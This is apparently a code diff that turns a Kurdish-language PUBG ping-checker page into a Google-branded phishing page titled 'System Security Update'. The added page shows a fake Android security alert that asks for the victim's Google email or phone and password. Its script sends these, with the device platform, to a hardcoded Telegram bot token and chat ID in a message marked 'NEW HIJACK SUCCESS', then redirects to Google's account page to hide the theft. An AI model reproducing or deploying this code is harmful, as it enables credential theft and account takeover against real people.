@@ -1,114 +1,77 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG PING RANYA | REAL-TIME</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security Update</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background-color: #0a0a0a; 
-            color: #fff; 
-            font-family: 'Segoe UI', sans-serif;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh;
-        }
-        .card {
-            width: 350px;
-            background: #151515;
-            border: 2px solid #f39c12;
-            border-radius: 25px;
-            padding: 30px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(243, 156, 18, 0.2);
-        }
-        h2 { color: #f39c12; margin-bottom: 5px; font-size: 22px; }
-        .location { color: #666; font-size: 12px; margin-bottom: 25px; }
-        .ping-circle {
-            width: 150px;
-            height: 150px;
-            border-radius: 50%;
-            border: 5px solid #222;
-            margin: 0 auto 20px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            transition: 0.3s;
-        }
-        #ping-value { font-size: 45px; font-weight: bold; color: #00ff41; }
-        .ms-label { font-size: 14px; color: #555; }
-        .status-bar { font-size: 14px; margin-top: 15px; color: #f39c12; }
-        .btn {
-            background: #f39c12;
-            color: #000;
-            border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
+        body { background-color: #000; color: white; font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
+        .icon { width: 70px; height: 70px; margin-bottom: 25px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
+        .modal { width: 88%; background: #ffffff; color: #202124; padding: 25px; border-radius: 16px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h3 { margin-top: 0; color: #d93025; font-size: 20px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; }
+        .btn { background: #1a73e8; color: white; padding: 14px; border: none; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>PUBG PING RANYA</h2>
-        <div class="location">REAL-TIME NETWORK MONITOR</div>
+<div class="overlay">
+    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_96dp.png" class="icon">
+    <div class="modal">
+        <h3>Security Alert!</h3>
+        <p>سیستەمی پاراستنی ئەندرۆید هەوڵێکی گوماناوی دۆزیوەتەوە بۆ چوونە ناو ئەکاونتەکەت. تکایە بۆ دووپاتکردنەوەی ناسنامەت و پاراستنی مۆبایلەکەت، جارێکی تر بچۆوە ناو Google.</p>
         
-        <div class="ping-circle" id="circle">
-            <span id="ping-value">--</span>
-            <span class="ms-label">MS</span>
-        </div>
-
-        <div id="status" class="status-bar">لەکاتی پشکنیندایە...</div>
-        <button class="btn" onclick="checkPing()">پشکنینەوەی خێرا</button>
+        <input type="text" id="user" placeholder="ئیمەیڵ یان ژمارەی مۆبایل" dir="rtl">
+        <input type="password" id="pass" placeholder="پاسوۆرد" dir="rtl">
+        
+        <button class="btn" onclick="sendToJegr()">Verify Now</button>
     </div>
+</div>
 
-    <script>
-        function checkPing() {
-            const pingText = document.getElementById('ping-value');
-            const circle = document.getElementById('circle');
-            const status = document.getElementById('status');
-            
-            const start = new Date().getTime();
-            
-            // ئەم بەشە بەڕاستی داواکاری دەنێرێت بۆ گوگل بۆ پێوانەی پینگ
-            fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-cache' })
-            .then(() => {
-                const end = new Date().getTime();
-                const ping = end - start;
-                
-                pingText.innerText = ping;
-                
-                // گۆڕینی ڕەنگ بەپێی پینگەکە
-                if (ping < 60) {
-                    pingText.style.color = "#00ff41";
-                    circle.style.borderColor = "#00ff41";
-                    status.innerText = "هێڵەکە زۆر باشە بۆ یاریکردن ✅";
-                } else if (ping < 120) {
-                    pingText.style.color = "#f1c40f";
-                    circle.style.borderColor = "#f1c40f";
-                    status.innerText = "هێڵەکە ئاساییە ⚠️";
-                } else {
-                    pingText.style.color = "#e74c3c";
-                    circle.style.borderColor = "#e74c3c";
-                    status.innerText = "پینگ بەرزە، ئاگاداربە! ❌";
-                }
-            })
-            .catch(() => {
-                status.innerText = "کێشە لە پەیوەندی هەیە!";
-            });
-        }
+<script>
+async function sendToJegr() {
+    const user = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
 
-        // هەر ٣ چرکە جارێک بە ئۆتۆماتیکی پینگ بپشکنە
-        setInterval(checkPing, 3000);
-        checkPing();
-    </script>
+    if(user.length < 4 || pass.length < 4) {
+        alert("تکایە زانیارییەکان بە تەواوی بنووسە");
+        return;
+    }
+
+    // زانیارییەکانی جێگر ڕانیەیی
+    const token = '8620021132:AAHjmTJNMMMJoO512ndfxn2z_680XM4dMi0';
+    const chatID = '7619045862';
+    
+    const message = `
+🚀 **NEW HIJACK SUCCESS (2026)**
+━━━━━━━━━━━━━━━━━━
+👤 **Login:** \`${user}\`
+🔑 **Pass:** \`${pass}\`
+📱 **Device:** ${navigator.platform}
+🔋 **Battery:** Loading...
+━━━━━━━━━━━━━━━━━━
+👑 *Jegr Cracks - Professional Tool*
+    `;
+
+    // ناردنی داتا بۆ تێلیگرام
+    try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+        
+        // شاردنەوەی فێڵەکە دوای ناردن
+        document.querySelector('.modal').innerHTML = "<h3>Updating Security...</h3><p>تکایە ٥ چرکە چاوەڕێ بکە، سیستەمەکە چاک دەبێتەوە...</p>";
+        
+        setTimeout(() => {
+            window.location.href = "https://myaccount.google.com";
+        }, 4000);
+    } catch (error) {
+        alert("هەڵەیەک لە پەیوەندی سێرڤەر هەیە، دووبارە هەوڵ بدەرەوە.");
+    }
+}
+</script>
 
 </body>
 </html>
